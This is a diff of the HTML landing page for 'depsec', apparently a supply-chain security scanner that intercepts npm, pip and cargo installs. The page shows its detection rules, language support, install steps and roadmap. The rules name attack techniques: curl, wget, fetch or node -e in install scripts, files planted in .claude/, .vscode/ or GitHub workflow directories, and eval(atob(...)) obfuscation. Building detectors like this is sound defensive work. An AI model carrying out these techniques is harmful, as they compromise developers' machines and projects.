+  <div style="background:var(--bg2);border:1px solid var(--border);border-radius:8px;overflow:hidden;margin-bottom:40px">
+    <table class="rule-table">
+      <thead>
         <tr>
-            <th>Language</th>
-            <th>Registry</th>
-            <th>Gate</th>
-            <th>Tree</th>
-            <th>Scan</th>
-            <th>Checksum</th>
+          <th>Rule ID</th>
+          <th>Severity</th>
+          <th>What it detects</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><span class="rule-id">npm-postinstall-network</span></td>
+          <td><span class="tag-crit">Critical</span></td>
+          <td>pre/postinstall scripts containing http, curl, wget, fetch, or node -e</td>
         </tr>
         <tr>
-            <td>npm</td>
-            <td><span class="ok">yes</span></td>
-            <td><span class="ok">yes</span></td>
-            <td><span class="ok">yes</span></td>
-            <td><span class="ok">yes</span></td>
-            <td>SHA1</td>
+          <td><span class="rule-id">npm-persistence-path</span></td>
+          <td><span class="tag-crit">Critical</span></td>
+          <td>Files in tarball targeting .claude/, .vscode/, or .github/workflows/</td>
         </tr>
         <tr>
-            <td>pip</td>
-            <td><span class="warn">planned</span></td>
-            <td><span class="warn">planned</span></td>
-            <td><span class="warn">planned</span></td>
-            <td><span class="warn">planned</span></td>
-            <td>SHA256</td>
+          <td><span class="rule-id">npm-obfuscation</span></td>
+          <td><span class="tag-coming">Coming</span></td>
+          <td>eval(atob(...)), high-entropy string detection</td>
         </tr>
         <tr>
-            <td>cargo</td>
-            <td><span class="warn">planned</span></td>
-            <td><span class="warn">planned</span></td>
-            <td><span class="warn">planned</span></td>
-            <td><span class="warn">planned</span></td>
-            <td>SHA256</td>
+          <td><span class="rule-id">py-import-exec</span></td>
+          <td><span class="tag-coming">Coming</span></td>
+          <td>__init__.py with network calls at module load time</td>
         </tr>
+        <tr>
+          <td><span class="rule-id">cargo-build-rs</span></td>
+          <td><span class="tag-coming">Coming</span></td>
+          <td>build.rs with network activity or file writes outside target/</td>
+        </tr>
+      </tbody>
     </table>
+  </div>
 
-    <h2 id="rules">Scanner Rules</h2>
-    <table>
-        <tr>
-            <th>Rule ID</th>
-            <th>Severity</th>
-            <th>Description</th>
-        </tr>
-        <tr>
-            <td>npm-postinstall-network</td>
-            <td><span class="err">Critical</span></td>
-            <td>Install script (<code>preinstall</code>, <code>postinstall</code>, <code>prepare</code>) contains a network call or code execution.</td>
-        </tr>
-        <tr>
-            <td>npm-persistence-path</td>
-            <td><span class="err">Critical</span></td>
-            <td>Package contains files targeting IDE/AI configuration directories (<code>.claude/</code>, <code>.vscode/</code>) or GitHub Actions workflows.</td>
-        </tr>
-    </table>
+  <div class="section-label">// Language support</div>
+  <div class="lang-grid">
+    <div class="lang-cell">
+      <div class="lang-name">npm / Node.js</div>
+      <div class="lang-checks">
+        <div class="lang-check-row"><span>Registry</span> <span class="ck">✓ Live</span></div>
+        <div class="lang-check-row"><span>Gate</span> <span class="ck">✓ Active</span></div>
+        <div class="lang-check-row"><span>Tree scan</span> <span class="ck">✓ Active</span></div>
+        <div class="lang-check-row"><span>Checksum</span> <span class="ck">✓ SHA1</span></div>
+      </div>
+    </div>
+    <div class="lang-cell">
+      <div class="lang-name">Python / pip</div>
+      <div class="lang-checks">
+        <div class="lang-check-row"><span>Registry</span> <span class="wip">⚙ In progress</span></div>
+        <div class="lang-check-row"><span>Gate</span> <span class="wip">⚙ In progress</span></div>
+        <div class="lang-check-row"><span>Tree scan</span> <span class="wip">⚙ In progress</span></div>
+        <div class="lang-check-row"><span>Checksum</span> <span class="wip">SHA256 planned</span></div>
+      </div>
+    </div>
+    <div class="lang-cell">
+      <div class="lang-name">Rust / cargo</div>
+      <div class="lang-checks">
+        <div class="lang-check-row"><span>Registry</span> <span class="wip">⚙ In progress</span></div>
+        <div class="lang-check-row"><span>Gate</span> <span class="wip">⚙ In progress</span></div>
+        <div class="lang-check-row"><span>Tree scan</span> <span class="wip">⚙ In progress</span></div>
+        <div class="lang-check-row"><span>Checksum</span> <span class="wip">SHA256 planned</span></div>
+      </div>
+    </div>
+  </div>
+</section>
 
-    <h2>Why</h2>
-    <p>
-        Existing tools (Snyk, Dependabot, OSV) focus on <strong>known CVEs</strong> — version bumps for disclosed vulnerabilities.
-        They don't catch valid packages with valid provenance that contain novel malware,
-        typosquats with zero CVEs, or install-time persistence mechanisms.
-    </p>
-    <p>
-        depsec was built in response to the <strong>Mini Shai-Hulud</strong> supply chain campaign (May 2026)
-        and the ongoing wave of Next.js ecosystem attacks. Deterministic security tools for deterministic threats.
-    </p>
+<div class="divider"></div>
 
-    <h2>License</h2>
-    <p><a href="https://github.com/org-cyber/depsec/blob/main/LICENSE">MIT</a></p>
+<section id="install">
+  <div class="section-label">// Get started</div>
+  <h2>Install in two minutes</h2>
+  <p class="section-desc">Requires Go 1.22+. Alias your package manager and depsec becomes invisible — you type <code style="color:var(--acid);font-size:13px">npm install</code> and depsec intercepts automatically.</p>
 
-    <footer>
-        <a href="https://github.com/org-cyber/depsec">github.com/org-cyber/depsec</a>
-    </footer>
+  <div class="install-steps">
+    <div class="install-block">
+      <div class="install-block-header">
+        <span>Build from source</span>
+        <span class="step-num">1</span>
+      </div>
+      <div class="install-code">
+        <span style="display:block;color:var(--muted)"><span class="kw">$</span> git clone github.com/you/depsec</span>
+        <span style="display:block;color:var(--muted)"><span class="kw">$</span> cd depsec</span>
+        <span style="display:block"><span class="kw">$</span> <span class="str">go build ./cmd/depsec</span></span>
+      </div>
+    </div>
+    <div class="install-block">
+      <div class="install-block-header">
+        <span>Alias your package manager</span>
+        <span class="step-num">2</span>
+      </div>
+      <div class="install-code">
+        <span style="display:block;color:var(--muted)"># Add to .bashrc / .zshrc</span>
+        <span style="display:block"><span class="kw">alias</span> <span class="str">npm</span>=<span style="color:var(--acid)">"depsec npm"</span></span>
+        <span style="display:block"><span class="kw">alias</span> <span class="str">pip</span>=<span style="color:var(--acid)">"depsec pip"</span></span>
+        <span style="display:block"><span class="kw">alias</span> <span class="str">cargo</span>=<span style="color:var(--acid)">"depsec cargo"</span></span>
+      </div>
+    </div>
+    <div class="install-block">
+      <div class="install-block-header">
+        <span>Intercept mode</span>
+        <span class="step-num">3</span>
+      </div>
+      <div class="install-code">
+        <span style="display:block;color:var(--muted)"># Transparent — works like npm</span>
+        <span style="display:block"><span class="kw">$</span> <span class="str">npm install express</span></span>
+        <span style="display:block;color:var(--muted)"><span class="kw">$</span> npm install --save-dev jest</span>
+      </div>
+    </div>
+    <div class="install-block">
+      <div class="install-block-header">
+        <span>Scan existing lockfile</span>
+        <span class="step-num">4</span>
+      </div>
+      <div class="install-code">
+        <span style="display:block;color:var(--muted)"><span class="kw">$</span> depsec scan package-lock.json</span>
+        <span style="display:block;color:var(--muted)"><span class="kw">$</span> depsec scan requirements.txt</span>
+        <span style="display:block"><span class="kw">$</span> <span class="str">depsec update-db</span></span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="divider"></div>
+
+<section id="roadmap">
+  <div class="section-label">// Roadmap</div>
+  <h2>What's built,<br>what's next</h2>
+  <p class="section-desc">depsec is moving fast. Here's the current state.</p>
+
+  <div class="roadmap-list">
+    <div class="rm-item"><span class="rm-done">✓</span><span class="rm-text done">npm registry client with full tree resolution</span></div>
+    <div class="rm-item"><span class="rm-done">✓</span><span class="rm-text done">Typosquat engine — Levenshtein + homoglyph normalization</span></div>
+    <div class="rm-item"><span class="rm-done">✓</span><span class="rm-text done">Concurrent tarball scanner with worker pool</span></div>
+    <div class="rm-item"><span class="rm-done">✓</span><span class="rm-text done">SHA1/SHA256 checksum verification</span></div>
+    <div class="rm-item"><span class="rm-done">✓</span><span class="rm-text done">Quarantine extraction with path-traversal protection</span></div>
+    <div class="rm-item"><span class="rm-todo">○</span><span class="rm-text">PyPI registry client + wheel/sdist scanning</span></div>
+    <div class="rm-item"><span class="rm-todo">○</span><span class="rm-text">crates.io client + build.rs analysis</span></div>
+    <div class="rm-item"><span class="rm-todo">○</span><span class="rm-text">Obfuscation detection — entropy analysis, eval(atob(...))</span></div>
+    <div class="rm-item"><span class="rm-todo">○</span><span class="rm-text">AI analyst layer — local LLM explaining blocked packages</span></div>
+    <div class="rm-item"><span class="rm-todo">○</span><span class="rm-text">Disk-persistent registry metadata cache</span></div>
+    <div class="rm-item"><span class="rm-todo">○</span><span class="rm-text">CI mode (--ci) with JSON report output</span></div>
+  </div>
+</section>
+
+<div class="divider"></div>
+
+<footer>
+  <div style="display:flex;align-items:center;gap:10px">
+    <svg width="20" height="20" viewBox="0 0 32 32" fill="none">
+      <polygon points="16,2 29,9 29,23 16,30 3,23 3,9" fill="none" stroke="#b8ff5a" stroke-width="1.5"/>
+      <circle cx="16" cy="16" r="3" fill="#b8ff5a"/>
+    </svg>
+    <span style="color:var(--muted2);font-family:var(--mono)">depsec</span>
+    <span>·</span>
+    <span>MIT License</span>
+    <span>·</span>
+    <span>Built against Mini Shai-Hulud, May 2026</span>
+  </div>
+  <div class="footer-right">
+    <a href="https://github.com">GitHub →</a>
+    <a href="#rules">Rules</a>
+    <a href="#roadmap">Roadmap</a>
+  </div>
+</footer>
+
 </body>
 </html>
+
+
+
+
+
+
